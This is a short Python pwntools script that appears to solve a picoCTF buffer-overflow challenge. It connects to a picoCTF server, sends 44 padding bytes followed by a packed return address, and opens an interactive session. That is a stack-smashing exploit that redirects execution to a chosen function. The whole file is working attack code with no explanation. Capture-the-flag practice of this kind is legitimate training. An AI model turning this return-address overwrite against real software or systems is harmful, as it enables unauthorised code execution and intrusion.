from pwn import *

r = remote("saturn.picoctf.net", 53595)
#r = process("./vuln")

payload = b"a"*44 + p64(0x080491f6)
r.sendline(payload)
r.interactive()